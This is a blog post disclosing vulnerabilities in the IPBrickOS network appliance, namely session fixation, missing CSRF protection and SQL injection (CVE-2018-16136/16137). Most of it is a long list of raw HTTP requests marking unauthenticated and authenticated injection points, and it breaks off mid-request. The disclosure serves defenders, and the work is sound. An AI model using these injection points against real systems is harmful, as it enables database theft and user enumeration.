---
layout: post
title:  "Multiple Vulnerabilties in IPBrickOS (CVE-2018-16136) (CVE-2018-16137) (CVE-2018-16138)"
date:   2019-02-01 01:01:00 +0100
categories: web multiple
---

In today's post we will look into an Operating System designed as an All-in-one solution to carry out management of enterprise computer networks. It acts as a firewall VoIP central, WebServer, FileServer and so on..

Although the "OS" (IPBrickOS) uses open source libraries and tools, they are poorly implemented. Since the company provides a trial for testing the system, I decided to install it, configure it like any other and try it out to look for anything sketchy.


It wasn't long for me to find situations that are not common in a security application, let alone a firewall.


Let's start at the beginning. IPBrickOS (administrator interface) has a vulnerability called [Session Fixation](https://www.owasp.org/index.php/Session_fixation). This vulnerability causes the reuse of a session that shouldn't be active anymore. In dumb terms on the login page, there is a method that counts down the session time to expire. After the time expire the session should be destroyed, and a new session ID should be provided upon the request.
However, if we make a request with the same sessionID, it's accepted, and the login will be "regenerated".

This is dangerous since, for some reason, an attacker obtains a session cookie that had expired, if the administrators' logins again using the same cookie, the authentication is bypassed.

Some would say that the attack is a bit far fetched. But imagine if an attacker is able to set a cookie and wait for the administrator to login. Then he is able to, using the same cookie, to impersonate the user. This may be seen on the OWASP guide (link above) and how an attacker may do this.

Continuing reading this post will see that, this situation, is easy to exploit.

**CVE-2018-16136 Lack of Anti-CSRF tokens in the whole administrative interface**

The administrator interface (shortly called IPBrickOS from now on) does NOT enforce the check for CSRF. As seen in this [post](https://www.0x90.zone/websecurity/2017/12/11/CSRFandCOORS.html) this vulnerability may lead to the unknown submission of unwanted forms. An example: creating a new administrator to access the interface. And for the reader that thinks that POST forms aren't vulnerable, please read [this](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) carefully!

Every single form of this application is vulnerable. Yes, the administrator needs to be logged in, still not a vulnerability that should be presented in a security appliance.

**CVE-2018-16137 SQL injection**

This vulnerability is concerning. This security "solution" doesn't validate almost any forms. In part since they think that an authenticated user will not exploit the system to obtain access to the database. This "solution" obfuscates the PHP code with the [Zend Guard](http://www.zend.com/en/products/zend-guard), so it will be difficult to read source files. However, we can extrapolate some information from the database: Users, Passwords various configurations and so on.

Luckily we have both authenticated and unauthenticated SQL injection. Although the unauthenticated that I found are from a schema that doesn't have information about sessions. However, there is an unauthenticated SQL injection for the logs of the Web Proxy of the solution. This leaks out users and URLs. It can impact severely on the security of the enterprise to understand preferences and for user enumeration. Other endpoints are available related to other access that we can extrapolate from the URL of the injection points.

Unfortunately, the authenticated part is segregated from the authenticated part. However, that doesn't exclude the ability to escalate privileges.

**UnAuthenticated**

```
POST
https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
dateStart=2018-03-14&dateEnd=2018-03-14&periodo=1&musername=1&msourceip=1&mtimestamp=1&msize=1&mcode=1&murl=1&fusername=*&fsourceip=&furl=&offset=0&limit=100&orderby=0&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
dateStart=2018-03-14&dateEnd=2018-03-14&periodo=1&musername=1&msourceip=1&mtimestamp=1&msize=1&mcode=1&murl=1&fusername=&fsourceip=&furl=*&offset=0&limit=100&orderby=0&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
dateStart=2018-03-14&dateEnd=2018-03-14&periodo=1&musername=1&msourceip=1&mtimestamp=1&msize=1&mcode=1&murl=1&fusername=&fsourceip=*&furl=&offset=0&limit=100&orderby=0&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
dateStart=2018-03-14*&dateEnd=2018-03-14&periodo=1&musername=1&msourceip=1&mtimestamp=1&msize=1&mcode=1&murl=1&fusername=&fsourceip=&furl=&offset=0&limit=100&orderby=0&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
dateStart=2018-03-14&dateEnd=2018-03-14*&periodo=1&musername=1&msourceip=1&mtimestamp=1&msize=1&mcode=1&murl=1&fusername=&fsourceip=&furl=&offset=0&limit=100&orderby=0&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ssl.php
dateStart=2018-03-16*&dateEnd=2018-03-16&periodo=1&offset=0&limit=100&orderby=1&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ssl.php
dateStart=2018-03-16&dateEnd=2018-03-16*&periodo=1&offset=0&limit=100&orderby=1&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ppp.php
dateStart=2018-03-16*&dateEnd=2018-03-16&periodo=1&offset=0&limit=100&orderby=1&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ppp.php
dateStart=2018-03-16&dateEnd=2018-03-16*&periodo=1&offset=0&limit=100&orderby=1&orderby2=0
```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ftp.php
dateStart=2018-03-16*&dateEnd=2018-03-16&periodo=1&offset=0&limit=100&orderby=1&orderby2=0

```

```
POST
https://ipbrick.domain.com/ajax/generateXMLAccesses_ftp.php
dateStart=2018-03-16&dateEnd=2018-03-16*&periodo=1&offset=0&limit=100&orderby=1&orderby2=0
```

**Authenticated**

```
GET
https://ipbrick.domain.com/corpo.php?pagina=utilizador_alterar&f_utilizador=*
```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=voip_placas_pstn_inserir&tipoplaca=297373351*
```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&dateStart=2018-03-16&dateEnd=2018-03-16&periodo=1&a_ppp=ppp*&offset=0&limit=0

```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&dateStart=2018-03-16&dateEnd=2018-03-16&periodo=1&a_ssl=ssl*&offset=0&limit=0
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a

```


```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```


```
GET
https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&dateStart=2018-03-16&dateEnd=2018-03-16*&periodo=1&a_ppp=ppp&offset=0&limit=0
```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&dateStart=2018-03-16*&dateEnd=2018-03-16&periodo=1&a_ppp=ppp&offset=0&limit=0
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```


```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_options_alterar_altera\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"option\"\x0d\x0a\x0d\x0aintercom\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"estado_intercom_unidir\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_unidir\"\x0d\x0a\x0d\x0a*62*\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"estado_intercom_bidir\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_bidir\"\x0d\x0a\x0d\x0a*63\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_restriction\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------9173100016821337141718121561--\x0d\x0a
```

```
GET
https://ipbrick.domain.com/corpo.php?pagina=user_sys_ver&f_idusersystem=172115923*
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192*&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168*&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69*&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99*&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192*&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168*&f_ip_inicio_3=69&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69*&f_ip_inicio_4=90&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
pagina=vpn_configuracao_alterar_altera&f_ip_inicio_1=192&f_ip_inicio_2=168&f_ip_inicio_3=69&f_ip_inicio_4=90*&f_ip_fim_1=192&f_ip_fim_2=168&f_ip_fim_3=69&f_ip_fim_4=99&f_accao=Modify
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  *\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```


```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; 